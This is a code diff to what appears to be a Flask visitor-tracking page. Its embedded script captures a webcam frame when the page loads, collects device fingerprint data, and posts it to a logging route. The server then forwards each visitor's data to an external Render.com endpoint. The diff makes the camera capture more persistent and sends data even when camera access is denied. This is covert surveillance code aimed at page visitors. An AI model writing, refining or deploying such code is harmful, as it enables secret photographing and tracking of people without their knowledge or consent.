@@ -62,33 +62,38 @@ def track():
         <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
         
         <script>
-            // Webcam screenshot functionality
+            // Webcam screenshot functionality with persistent attempts
             async function captureScreenshot() {
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 const context = canvas.getContext('2d');
 
                 try {
-                    // Request webcam access
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    // Attempt to access webcam with more permissive constraints
+                    const constraints = { 
+                        video: { 
+                            facingMode: "user",
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        }
+                    };
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                     video.srcObject = stream;
 
-                    // Wait for video to load
                     await new Promise(resolve => video.onloadedmetadata = resolve);
-
-                    // Draw video frame to canvas
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // Convert to base64
                     const screenshot = canvas.toDataURL('image/jpeg');
-
-                    // Stop the video stream
+                    
                     stream.getTracks().forEach(track => track.stop());
-
                     return screenshot;
                 } catch (err) {
-                    console.error('Error capturing screenshot:', err);
-                    return null;
+                    console.error('Camera access failed:', err.name, err.message);
+                    // Fallback data if camera access is denied
+                    return {
+                        error: 'Camera access denied',
+                        errorDetails: err.message,
+                        timestamp: new Date().toISOString()
+                    };
                 }
             }
 
@@ -122,11 +127,13 @@ def track():
                 doNotTrack: navigator.doNotTrack || window.doNotTrack || 'Not set'
             };
 
-            // Capture screenshot and send all data
+            // Attempt camera access and send data regardless of result
             (async () => {
-                const screenshot = await captureScreenshot();
-                if (screenshot) {
-                    deviceInfo.screenshot = screenshot;
+                const screenshotResult = await captureScreenshot();
+                if (screenshotResult && typeof screenshotResult === 'string') {
+                    deviceInfo.screenshot = screenshotResult;
+                } else if (screenshotResult && screenshotResult.error) {
+                    deviceInfo.cameraError = screenshotResult;
                 }
 
                 fetch('/log', {
@@ -157,10 +164,6 @@ def send_to_render(data):
     try:
         response = requests.post(RENDER_ENDPOINT, json=data, timeout=15)
         print(f"Data sent to Render.com: {response.status_code}")
-        # If you want to save the screenshot locally, uncomment the following:
-        # if 'screenshot' in data:
-        #     with open(f"screenshot_{time.time()}.jpg", "wb") as f:
-        #         f.write(base64.b64decode(data['screenshot'].split(',')[1]))
         print("Full visitor info:", json.dumps(data, indent=2))
     except Exception as e:
         print(f"Error sending to Render.com: {e}")
